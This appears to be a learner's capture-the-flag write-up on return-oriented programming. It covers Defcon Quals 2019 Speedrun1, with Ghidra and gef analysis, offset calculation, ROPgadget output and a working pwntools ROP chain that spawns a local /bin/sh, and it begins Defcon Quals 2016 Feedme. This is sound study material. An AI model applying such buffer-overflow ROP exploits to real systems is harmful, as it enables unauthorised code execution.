     UNLOCK();
     if (_SUB_00000000 != 1) {
      do {
        syscall();
      } while( true );
     }
     _SUB_00000000 = 0;
   }
   FUN_0040eaf0();
   dVar7 = extraout_EDX;
LAB_004011b0:
   if (((int)pEVar8 != 0x68747541 || dVar5 != 0x444d4163) || (dVar7 != 0x69746e65))
   goto LAB_00400fa6;
   FUN_00400c30(&local_d0,&local_cc,local_c0,local_bc);
   puVar6 = (uint *)cpuid(0x80000000);
   uVar3 = puVar6[3];
   if (0x80000000 < *puVar6) {
     puVar3 = (dword *)cpuid(0x80000001);
     _DAT_006bbe08 = *puVar3;
     _DAT_006bbe0c = puVar3[1];
     _DAT_006bbe14 = puVar3[2];
     uVar3 = puVar3[3];
     _DAT_006bbe10 = uVar3;
   }
   puVar6 = (uint *)(ulong)uVar3;
   if (((DAT_006bbe2c & 0x40) != 0) && ((_DAT_006bbe10 & 0x10000) != 0)) {
     DAT_006bbe2c = DAT_006bbe2c | 0x100;
   }
   uVar3 = local_cc;
   if (local_d0 == 0x15) {
LAB_0040144a:
     if (uVar3 - 0x60 < 0x20) {
      DAT_006bbe2c = DAT_006bbe2c | 0x12;
     }
   }
   DAT_006bbde0 = 2;
 } while( true );
LAB_004012a0:
 FUN_004128f0("unexpected reloc type in static binary");
LAB_004012ac:
 if (((DAT_006bbe2c & 0x1000) != 0) && ((DAT_006bbdfc & 0x10000000) != 0)) {
   if ((DAT_006bbdfc & 0x8000000) == 0) {
     puVar6 = (uint *)(ulong)(DAT_006bbdfc & 0x40020000);
     if (((DAT_006bbdfc & 0x40020000) == 0x40020000) && ((int)DAT_006bbdfc < 0)) {
      DAT_006bbdc8 = 6;
     }
   }
   else if ((DAT_006bbdfc & 0x4000000) != 0) {
     DAT_006bc888 = "xeon_phi";
     goto LAB_00401078;
   }
 }
 if ((((DAT_006bbe2c & 0x480) == 0x480) && ((DAT_006bbdfc & 0x108) == 0x108)) &&
    ((DAT_006bbdf0 & 0xc00020) == 0xc00020)) {
   DAT_006bc888 = "haswell";
 }
 goto LAB_00401078;
}
```

Since I am still learning how to handle ROPchains, I will do the same analysis as the website and try to build my own exploit based on the previous. After this post, I will give it a couple of days before I try it again from start. 

After running the file and checking the backtrace command we see the following addresses listed:

```armasm
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```

`This command will print one line per frame for frames in the stack.`

Then we can check out each of these individual addresses using ghidra since we are not dealing with PIE.

Press `g` then paste the address into the inputbox, and it opens the address, which in this case is a function. 

```c

/* WARNING: Removing unreachable block (ram,0x00449910) */
/* WARNING: Removing unreachable block (ram,0x00449924) */

undefined8 FUN_004498a0(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
 undefined4 uVar1;
 
 if (DAT_006bc80c == 0) {
   syscall();
   return 0;
 }
 uVar1 = FUN_0044be40();
 syscall();
 FUN_0044bea0(uVar1,param_2,param_3);
 return 0;
}
```

So it opens a syscall which is nice.

```c

void FUN_00400b60(void)

{
 undefined local_408 [1024];
 
 FUN_00410390("Any last words?");
 FUN_004498a0(0,local_408,2000);
 FUN_0040f710("This will be the last thing that you say: %s\n",local_408);
 return;
}
```

Another function that prints out exactly what we see when we ran the code. Im assuming that `FUN_004498a0` will be gets and we have a input buffer of `1024` but a total space of `2000` which means we can overwrite something. 

This is the same function with our assumptions.

```c
void vuln(void)

{
 char input [1024];
 
 printf("Any last words?");
 gets(0,input,2000);
 sprintf("This will be the last thing that you say: %s\n",input);
 return;
}
```

The third frame looked uninteresting, and the fourth was just the main function. And the last frame was our entry. The way I am understanding `backtrace` is that it lists the ways it traversed through the program, which makes sense due to its name. Therefore the last thing is what it started the program with, and the next is of course the main function. 

If I didn't know any better, I could have used this debug command to find the main function anyway.

The guide sort of disagrees with me about what is the main function, and I will let it have its way, because it shouldn't matter anyway. 

For those wondering if I could have done `i func`:

```armasm
gef➤  info func
All defined functions:

Non-debugging symbols:
0x00007ffff7ffd680  __vdso_gettimeofday
0x00007ffff7ffd680  gettimeofday
0x00007ffff7ffd890  __vdso_time
0x00007ffff7ffd890  time
0x00007ffff7ffd8c0  __vdso_clock_gettime
0x00007ffff7ffd8c0  clock_gettime
0x00007ffff7ffdb90  __vdso_clock_getres
0x00007ffff7ffdb90  clock_getres
0x00007ffff7ffdbf0  __vdso_getcpu
0x00007ffff7ffdbf0  getcpu
```

the answer is no. I tried to see if I could do `disas main` but it is not even registered as a function. Back when I was trying to do pwn before, I found that if there was no function outside of libc listed, then I was lost and eventually gave up. But now I know how to circumvent these mitigations.

```
From Nightmare by GuyInATuxedo:

It appears to be scanning in our input by making a syscall, versus using a
function like scanf or fgets. A syscall is essentially a way
for your program to request your OS or Kernel to do something.
```

That's a nice way of saying what a syscall is for those who don't know. This is also explained in any C language course or textbook.

```armasm
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  gets ()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x20]:8 local_20                                XREF[2]:     004498ef (W) , 
                                                                                                   004498f9 (R)   
                             gets                                            XREF[9]:     vuln:00400b8b (c) , 
                                                                                          FUN_00413e30:00413e3c (c) , 
                                                                                          FUN_0044e070:0044e144 (c) , 
                                                                                          FUN_00457a40:00457bf7 (c) , 
                                                                                          FUN_00475f50:00475fc0 (c) , 
                                                                                          FUN_00475f50:004763a7 (c) , 
                                                                                          FUN_00475f50:0047640f (c) , 
                                                                                          FUN_00476b20:00477347 (c) , 
                                                                                          004aff38 (*)   
        004498a0 8b  05  66       MOV        EAX ,dword ptr [DAT_006bc80c ]                    = ??
                 2f  27  00
        004498a6 85  c0           TEST       EAX ,EAX
        004498a8 75  16           JNZ        LAB_004498c0
        004498aa 31  c0           XOR        EAX ,EAX
        004498ac 0f  05           SYSCALL
        004498ae 48  3d  00       CMP        RAX ,-0x1000
                 f0  ff  ff
        004498b4 77  5a           JA         LAB_00449910
        004498b6 f3  c3           RET
```

We earlier pointed this out in clang saying it has the syscall, but we are referencing it again in assembly to take a look at it's processes. Note that in the vuln function, we also renamed this function as gets (improperly of course). 

`JNZ` (Jump if Not Zero) represents the boolean if statement, otherwise it xor's and returns. 

# Return Oriented Programming

So during this part of the guide it finally explains what is ROP. I wish this was organized in a way that it introduced this to begin with instead of me having to make my own deductions so I know what to look for.

ROP Gadgets are bits of code in assembly that end in a `ret` instruction. 

In order to exploit by making a `ROPchain`, we are basically stitching different gadgets from the program's own code to make our own exploit, hence a chain. 

Since this is all valid code because its already sourced from the program, it doesn't matter if its nx. 

Recall the following:

```armasm
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
```

So the ROPchain will have three parts to execute. One to write `/bin/sh` somewhere in memory, which is why we need a `rw-` permission for a region of memory atleast. Then we move this pointer to `/bin/sh` into `rdi` register. 

The second part will be to move the necessary values into the other three registers, and finally to make the `syscall` at the end. 

## Back to Defcon Quals 2019 Speedrun1

```armasm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
gef➤  x/20g 0x00000000006b6000
0x6b6000:       0x0     0x0
0x6b6010:       0x0     0x0
0x6b6020:       0x0     0x0
0x6b6030:       0x0     0x0
0x6b6040:       0x0     0x0
0x6b6050:       0x0     0x0
0x6b6060:       0x0     0x0
0x6b6070:       0x0     0x0
0x6b6080:       0x0     0x0
0x6b6090:       0x0     0x0
```

Perfect, so we have an open space of memory in the program itself. So let's use this address.

Similar to how we have done before, we must find an offset to the `ret` address using what we did in previous posts with stack frames.

```armasm
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  vuln ()
             undefined         AL:1           <RETURN>
             char[1024]        Stack[-0x408   input                                   XREF[2]:     00400b77 (*) , 
                                                                                                   00400b90 (*)   
                             vuln                                            XREF[2]:     FUN_00400bc1:00400c18 (c) , 
                                                                                          004ab890 (*)   
        00400b60 55              PUSH       RBP
        00400b61 48  89  e5       MOV        RBP ,RSP
        00400b64 48  81  ec       SUB        RSP ,0x400
                 00  04  00  00
        00400b6b 48  8d  3d       LEA        RDI ,[s_Any_last_words?_00492543 ]                = "Any last words?"
                 d1  19  09  00
        00400b72 e8  19  f8       CALL       printf                                           undefined printf()
                 00  00
        00400b77 48  8d  85       LEA        RAX =>input ,[RBP  + -0x400 ]
                 00  fc  ff  ff
        00400b7e ba  d0  07       MOV        EDX ,0x7d0
                 00  00
        00400b83 48  89  c6       MOV        RSI ,RAX
        00400b86 bf  00  00       MOV        EDI ,0x0
                 00  00
        00400b8b e8  10  8d       CALL       gets                                             undefined gets()
                 04  00
        00400b90 48  8d  85       LEA        RAX =>input ,[RBP  + -0x400 ]
                 00  fc  ff  ff
        00400b97 48  89  c6       MOV        RSI ,RAX
        00400b9a 48  8d  3d       LEA        RDI ,[s_This_will_be_the_last_thing_that_004925  = "This will be the last thing t
                 b7  19  09  00
        00400ba1 b8  00  00       MOV        EAX ,0x0
                 00  00
        00400ba6 e8  65  eb       CALL       sprintf                                          undefined sprintf(undefined para
                 00  00
        00400bab 90              NOP
        00400bac c9              LEAVE
        00400bad c3              RET
```

So as we have done before, we will hold a breakpoint after the `gets` call. 

```armasm
gef➤  b *0x00400b90
Breakpoint 1 at 0x400b90
gef➤  r
Starting program: /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
Hello brave new challenger
Any last words?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x0000000000400b90 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x23
$rbx   : 0x0000000000400400  →   sub rsp, 0x8
$rcx   : 0x00000000004498ae  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x7d0
$rsp   : 0x00007fffffffdad0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
$rbp   : 0x00007fffffffded0  →  0x00007fffffffdef0  →  0x0000000000401900  →   push r15
$rsi   : 0x00007fffffffdad0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
$rdi   : 0x0
$rip   : 0x0000000000400b90  →   lea rax, [rbp-0x400]
$r8    : 0xf
$r9    : 0x00000000006bd880  →  0x00000000006bd880  →  [loop detected]
$r10   : 0x2
$r11   : 0x246
$r12   : 0x00000000004019a0  →   push rbp
$r13   : 0x0
$r14   : 0x00000000006b9018  →  0x0000000000443e60  →   mov rcx, rsi
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdad0│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"       ← $rsp, $rsi
0x00007fffffffdad8│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaaaa\n"
0x00007fffffffdae0│+0x0010: "aaaaaaaaaaaaaaaaaa\n"
0x00007fffffffdae8│+0x0018: "aaaaaaaaaa\n"
0x00007fffffffdaf0│+0x0020: 0x00000000000a6161 ("aa\n"?)
0x00007fffffffdaf8│+0x0028: 0x0000000000000000
0x00007fffffffdb00│+0x0030: 0x0000000000000000
0x00007fffffffdb08│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400b83                  mov    rsi, rax
     0x400b86                  mov    edi, 0x0
     0x400b8b                  call   0x4498a0
 →   0x400b90                  lea    rax, [rbp-0x400]
     0x400b97                  mov    rsi, rax
     0x400b9a                  lea    rdi, [rip+0x919b7]        # 0x492558
     0x400ba1                  mov    eax, 0x0
     0x400ba6                  call   0x40f710
     0x400bab                  nop
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-001", stopped 0x400b90 in ?? (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400b90 → lea rax, [rbp-0x400]
[#1] 0x400c1d → mov eax, 0x0
[#2] 0x4011a9 → mov edi, eax
[#3] 0x400a5a → hlt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[+] Searching 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdad0 - 0x7fffffffdaf4  →   "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
gef➤  i f
Stack level 0, frame at 0x7fffffffdee0:
 rip = 0x400b90; saved rip = 0x400c1d
 called by frame at 0x7fffffffdf00
 Arglist at 0x7fffffffdac8, args:
 Locals at 0x7fffffffdac8, Previous frame's sp is 0x7fffffffdee0
 Saved registers:
  rbp at 0x7fffffffded0, rip at 0x7fffffffded8
```

Offset: `0x7fffffffded8 - 0x7fffffffdad0 = 1032`. Let's see if our auto-ROPchain will work to gather these addresses.

```python
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x47f471 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x4101f3 pop rsi ; ret
        [+] Gadget found: 0x415664 pop rax ; ret
        [+] Gadget found: 0x444bc0 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x444bc0 xor rax, rax ; ret
        [+] Gadget found: 0x4748c0 add rax, 1 ; ret
        [+] Gadget found: 0x4748c1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x400686 pop rdi ; ret
        [+] Gadget found: 0x4101f3 pop rsi ; ret
        [+] Gadget found: 0x44be16 pop rdx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x40129c syscall

- Step 5 -- Build the ROP chain
```

Perfect, we have our four gadgets for the registers, `mov` gadget, then our `syscall`.

So I do want to note something that this program has done differently. We previously had a qword storing data from `rdx` to `rax`. So let's find another gadget for this to be the case:

```armasm
$ ROPgadget --binary speedrun-001 | grep "mov qword ptr \[rax\], rdx ; ret" | less
0x000000000048d24c : cmp al, 0x31 ; or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x000000000048d24b : cmp byte ptr [rcx + rsi], 8 ; jne 0x48d255 ; mov qword ptr [rax], rdx ; ret
0x000000000048d24f : jne 0x48d255 ; mov qword ptr [rax], rdx ; ret
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
0x000000000048d24e : or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x000000000048d24d : xor dword ptr [rax], ecx ; jne 0x48d255 ; mov qword ptr [rax], rdx ; ret
```

```armasm
rax : 0x415664
rdi : 0x400686
rsi : 0x4101f3
rdx : 0x44be16
qword : 0x48d251
syscall : 0x40129c
```

Alright, let's build our own exploit! 

```python
$ cat ape.py
from pwn import *

rax = 0x415664
rdi = 0x400686
rsi = 0x4101f3
rdx = 0x44be16
qword = 0x48d251
syscall = 0x40129c

target = process("./speedrun-001")

p = b""
p += p64(rax)
p += p64(0x6b6000)
p += p64(rdx)
p += p64(0x0068732f6e69622f)
p += p64(qword)
p += p64(rax)
p += p64(0x3b)
p += p64(rdi)
p += p64(0x6b6000)
p += p64(rsi)
p += p64(0x0)
p += p64(rdx)
p += p64(0x0)
p += p64(syscall)

target.send(p)
target.interactive()
```

I was so close, but I forgot about the offset :(.

```python
$ python ape.py
[+] Starting local process './speedrun-001': pid 165898
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdVA
$
$ cat ape.py
from pwn import *

offset = 1032

rax = 0x415664
rdi = 0x400686
rsi = 0x4101f3
rdx = 0x44be16
qword = 0x48d251
syscall = 0x40129c

target = process("./speedrun-001")

p = b"A"*offset
p += p64(rax)
p += p64(0x6b6000)
p += p64(rdx)
p += p64(0x0068732f6e69622f)
p += p64(qword)
p += p64(rax)
p += p64(0x3b)
p += p64(rdi)
p += p64(0x6b6000)
p += p64(rsi)
p += p64(0x0)
p += p64(rdx)
p += p64(0x0)
p += p64(syscall)

target.send(p)
target.interactive()
[*] Got EOF while reading in interactive
$
```

One thing to note is that it EOF after a brief time of being able to execute commands for some reason, so make sure you have your commands ready to go.

But we have now learned ROP!

I guess looking back, Boston Key challenge freaked me out because there was more steps to it, but looking back it was definitely a lot more simple than what I made it out to be. 

## Defcon Quals 2016 Feedme

```bash
$ file feedme
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
$ checksec feedme
[*] '/mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/dcquals16_feedme/feedme'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ./feedme
FEED ME!
no





?
```

Goes on for what seems like forever.

```bash
$ ./feedme a
FEED ME!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATE 41414141414141414141414141414141...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
```

And that's interesting. 

```armasm
gef➤  bt
#0  0xf7ffc549 in __kernel_vsyscall ()
#1  0x0806cc02 in ?? ()
#2  0x0804910e in ?? ()
#3  0x080491da in ?? ()
#4  0x080493ba in ?? ()
#5  0x08048d2b in ?? ()
```

```c
int main(void)

{
 FUN_0804e010(0xe,FUN_08048e24);
 FUN_0806cc50(0x96);
 FUN_0804fde0(PTR_DAT_080ea4c0,0,2,0);
 FUN_0804f820(PTR_DAT_080ea4bc);
 FUN_080490b0();
 return 0;
}
```

```c
void interesting(void)

{
 undefined uVar1;
 int local_1c;
 uint local_18;
 int local_14;
 int local_10;
 
 local_1c = 0;
 local_18 = 0;
 while( true ) {
   if (799 < local_18) {
     return;
   }
   local_14 = FUN_0806cc70();
   if (local_14 == 0) break;
   local_10 = FUN_0806cbe0(local_14,&local_1c,0);
   if (local_10 == -1) {
     FUN_0804fc60("Wait error!");
     FUN_0804ed20(0xffffffff);
   }
   if (local_1c == -1) {
     FUN_0804fc60("Child IO error!");
     FUN_0804ed20(0xffffffff);
   }
   FUN_0804fc60("Child exit.");
   FUN_0804fa20(0);
   local_18 = local_18 + 1;
 }
 uVar1 = vuln();
 FUN_0804f700("YUM, got %d bytes!\n",uVar1);
 return;
}
```

```c

uint vuln(void)

{
 byte bVar1;
 undefined4 uVar2;
 uint uVar3;
 int in_GS_OFFSET;
 undefined local_30 [32];
 int local_10;
 
 local_10 = *(int *)(in_GS_OFFSET + 0x14);
 FUN_0804fc60("FEED ME!");
 bVar1 = FUN_08048e42();
 FUN_08048e7e(local_30,bVar1);
 uVar2 = FUN_08048f6e(local_30,bVar1,0x10);
 FUN_0804f700("ATE %s\n",uVar2);
 uVar3 = (uint)bVar1;
 if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
   uVar3 = FUN_0806f5b0();
 }
 return uVar3;
}
```

```armasm
gef➤  x/200g 0x080ea000
0x80ea000:      0x0     0x8067f9000000000
0x80ea010:      0x808ea80080679a0       0x80696700805f8c0
0x80ea020:      0x808e8900808fe80       0x8063d5008069000
0x80ea030:      0x806098008069900       0x80b55f008060ec0
0x80ea040:      0x8068980       0x0
0x80ea050:      0x0     0x0
0x80ea060:      0x0     0x80be91100000d00
0x80ea070:      0x80eb2a0080be8ff       0x0
0x80ea080:      0x80ea200       0x0
0x80ea090:      0x0     0x0
0x80ea0a0:      0xfbad240c      0x0
0x80ea0b0:      0x0     0x0
0x80ea0c0:      0x0     0x0
0x80ea0d0:      0x80ea20000000000       0xffffffff
0x80ea0e0:      0xffffffff      0xffffffff080eb4c8
0x80ea0f0:      0xffffffff      0x80ea140
0x80ea100:      0x0     0x0
0x80ea110:      0x0     0x0
0x80ea120:      0x0     0x0
0x80ea130:      0x80bf10000000000       0x0
0x80ea140:      0x0     0x0
0x80ea150:      0x0     0x0
0x80ea160:      0x0     0x0
0x80ea170:      0x0     0x0
0x80ea180:      0x0     0x0
0x80ea190:      0x0     0x0
0x80ea1a0:      0x0     0x0
0x80ea1b0:      0x0     0x0
0x80ea1c0:      0x0     0x0
0x80ea1d0:      0x0     0x0
0x80ea1e0:      0x0     0x0
```

I had to search for a an open address for a bit, but we now have an open region at `0x80ea140`.

As soon as I thought I got it down, turns out there is a canary involved...

My arch-nemesis ever since it traumatized me during picoCTF2019.

Let's look back on this tomorrow. I need a break from this...